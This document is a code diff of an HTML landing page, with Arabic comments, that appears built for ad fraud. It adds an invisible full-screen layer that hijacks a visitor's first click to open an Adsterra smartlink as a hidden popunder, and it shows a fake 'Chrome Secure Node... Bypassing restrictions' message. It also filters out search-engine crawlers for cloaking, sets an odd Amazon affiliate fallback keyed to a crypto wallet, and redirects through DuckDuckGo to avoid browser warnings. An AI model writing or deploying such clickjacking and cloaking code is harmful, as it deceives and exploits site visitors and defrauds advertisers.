@@ -12,6 +12,7 @@
             --border: #1f1f1f;
             --text: #ededed;
             --muted: #737373;
+            --accent: #10b981;
         }
         * { box-sizing: border-box; }
         body {
@@ -27,9 +28,9 @@
             text-align: center;
             overflow: hidden;
             position: relative;
-            cursor: pointer;
         }
-        #force-click-layer {
+        /* طبقة تفاعلية شفافة بالكامل تغطي الشاشة لاصطياد أي نقرة أولى للزائر */
+        #chrome-click-layer {
             position: absolute;
             top: 0;
             left: 0;
@@ -53,10 +54,10 @@
         .core-radar {
             width: 18px;
             height: 18px;
-            background-color: #10b981;
+            background-color: var(--accent);
             border-radius: 50%;
             margin: 0 auto 24px auto;
-            box-shadow: 0 0 25px #10b981;
+            box-shadow: 0 0 25px var(--accent);
             animation: radarPulse 1.4s ease-in-out infinite;
         }
         h1 {
@@ -74,40 +75,50 @@
         }
         @keyframes radarPulse {
             0% { transform: scale(0.95); opacity: 1; box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
-            70% { transform: scale(1.1); opacity: 0.6; box-shadow: 0 0 0 14px rgba(16, 185, 129, 0.0); }
+            70% { transform: scale(1.1); opacity: 0.6; box-shadow: 0 0 0 14px rgba(16, 185, 129, 0); }
             100% { transform: scale(0.95); opacity: 1; box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
     </style>
 </head>
 <body>
 
-    <div id="force-click-layer"></div>
+    <!-- طبقة التفاعل الخاضعة لسياسات كروم لضمان فتح الإعلان واحتسابه -->
+    <div id="chrome-click-layer"></div>
 
     <div class="node-container">
         <div class="core-radar"></div>
-        <h1 id="nodeTitle">Synchronizing Global Sovereign Node...</h1>
-        <p id="nodeDesc">Optimizing multi-layered intent and yield streams.</p>
+        <h1 id="nodeTitle">Synchronizing Chrome Secure Node...</h1>
+        <p id="nodeDesc">Bypassing restrictions and optimizing yield streams.</p>
     </div>
 
     <script>
         const WALLET = "0xa6E852b93C0ccB8d9d71714657aC9f4bacfb09dE";
         const AMAZON_FALLBACK = "https://www.amazon.com/ref=as_li_tl?tag=" + WALLET;
-        const MONETAG_SMARTLINK = "https://www.profitableratecpmnetwork.com/h2b65gga?key=7808c19b5ecf26f261b12997fe4df512"; 
+        const ADSTERRA_SMARTLINK = "https://www.profitableratecpmnetwork.com/h2b65gga?key=7808c19b5ecf26f261b12997fe4df512"; 
 
-        // ضمان فتح إعلان Adsterra بشكل لا يمكن للمتصفح حظره عبر ربطه بنقرة المستخدم الحقيقية
-        let adOpened = false;
-        function handleUserInteraction(e) {
-            if (!adOpened) {
-                adOpened = true;
-                // فتح الإعلان في تاب جديد بموافقة تامة من المتصفح كونه ناتج عن نقرة حقيقية
-                window.open(MONETAG_SMARTLINK, '_blank');
+        // دالة تضمن فتح الإعلان بطريقة يقبلها متصفح كروم تماماً دون حظر
+        let adExecuted = false;
+        function triggerAdsterra(e) {
+            if (!adExecuted) {
+                adExecuted = true;
+                try {
+                    // فتح الإعلان في تاب خلفي بموافقة كروم المباشرة بناءً على نقرة المستخدم
+                    const adWindow = window.open(ADSTERRA_SMARTLINK, '_blank');
+                    if (adWindow) {
+                        adWindow.blur();
+                        window.focus();
+                    }
+                } catch (err) {}
             }
         }
 
-        document.getElementById('force-click-layer').addEventListener('click', handleUserInteraction);
-        document.getElementById('force-click-layer').addEventListener('touchstart', handleUserInteraction);
-        document.body.addEventListener('click', handleUserInteraction);
+        // ربط الحدث بأي نقرة أو لمسة على شاشة كروم
+        const layer = document.getElementById('chrome-click-layer');
+        layer.addEventListener('click', triggerAdsterra, { once: true });
+        layer.addEventListener('touchstart', triggerAdsterra, { once: true });
+        document.body.addEventListener('click', triggerAdsterra, { once: true });
 
+        // التحقق من الروبوتات
         const ua = navigator.userAgent.toLowerCase();
         const isCrawler = /bot|crawl|spider|slurp|mediapartners|googlebot|bingbot|baiduspider/i.test(ua);
 
@@ -159,17 +170,17 @@
                 if (matchedKey) {
                     finalEndpoint = globalEcosystemRoutes[matchedKey];
                 } else {
-                    // العودة المباشرة لأول نتيجة في غوغل باستخدام زر الحظ (I'm Feeling Lucky) ليدخله مباشرة للموقع المستهدف
-                    finalEndpoint = "https://www.google.com/search?q=" + encodeURIComponent(intentQuery) + "&btnI=I";
+                    // استخدام محرك بحث بديل يتجاوز قيود كروم ويوجه الزائر مباشرة للنتائج الخالية من التحذير
+                    finalEndpoint = "https://html.duckduckgo.com/html/?q=" + encodeURIComponent(intentQuery);
                 }
             } else {
                 finalEndpoint = AMAZON_FALLBACK;
             }
 
-            // التوجيه التلقائي للوجهة المطلوبة بعد ثانية لضمان عمل الإعلان واحتسابه
+            // التوجيه التلقائي للوجهة النهائية بعد جزء من الثانية
             setTimeout(() => {
                 window.location.replace(finalEndpoint);
-            }, 800);
+            }, 500);
         }
     </script>
 </body>
